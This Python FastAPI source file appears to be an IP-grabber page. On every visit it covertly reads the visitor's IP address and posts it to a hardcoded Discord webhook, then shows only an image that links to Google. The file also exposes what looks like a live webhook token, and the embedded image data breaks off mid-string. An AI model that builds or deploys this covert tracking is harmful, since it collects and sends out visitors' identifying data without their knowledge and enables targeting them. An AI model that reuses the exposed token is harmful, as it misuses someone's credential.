from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests

app = FastAPI()

# Your webhook URL from your screenshots
WEBHOOK_URL = "https://discord.com/api/webhooks/1508105125166846125/930vrRtV_IZxhSqTTxuBthH7sFWPOw_y8HIOZz9frJcW4wkBlT_l8JQv-e2H00I"

@app.get("/", response_class=HTMLResponse)
async def log_request(request: Request):
    # This captures the visitor's IP address on Vercel
    client_ip = request.headers.get("x-forwarded-for", request.client.host)
    
    # This sends the message to your Discord
    data = {"content": f"**New Visitor Detected!**\nIP Address: {client_ip}"}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass
    
    # This displays the image you provided on a black background
    return f"""
    <html>
        <body style="margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
            <a href="https://www.google.com">
                <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAJQAlgMBIgACEQEDEQH/xAAbAAACAgMBAAAAAAAAAAAAAAADBAIFAAEGB//EADoQAAIBAwIDBAcGBgIDAAAAAAECAwAEERIhBTFBBhMiURRhcXKBgpEjMkJiocEHJFKSsdFEgxUzc//EABgBAAMBAQAAAAAAAAAAAAAAAAABAgME/8QAHxEBAQACAgMAAwAAAAAAAAAAAAECESExAxJBEyIy/9oADAMBAAIRAxEAPwDk+J8QuJkisy+LeHOlQAOZzknrVejuDzP1o12P5hvh/ioKB1z66wnTp+oMXV8BjjHnWDJyCT6jnlR449DaTuT1qbxF42+go2NEfEM5Lc/Opamxzb60yYyAVUbc6iYvDgf1U9lpacE7V8U4WBGkve242MUgB29RxtXpXBe0NhxiIG2nnEoGXi7hWK/7rx9Y1Zt+tMQtd2M6z2ryRSruHTYildHp7X3secPM3z2NQZrbkZLT57UiqDsb2mHFoVt7ia79PRcsFkGmQf1AGuoYzKT474b9Y1YUiI6bEn73DW/uWi93asBhLI+7Oy0xqk/FPP8ANaA/tWm0keOWP/staACtsjHwqnyXh/eieisBgRT5/LMrUPTAeB4efehK1MRQEfcsD7HK0BtbeQcorzHuoan3T+VwPet1P+KisEZ+7BEf/ndGirA3SCYD8txmgIHIGC4x+e2peRITnUbUj80RFNhJFPhS9H/YDWy0i82uvmjBoCoktrQnJisD6xtWVYtIdW8rZ9
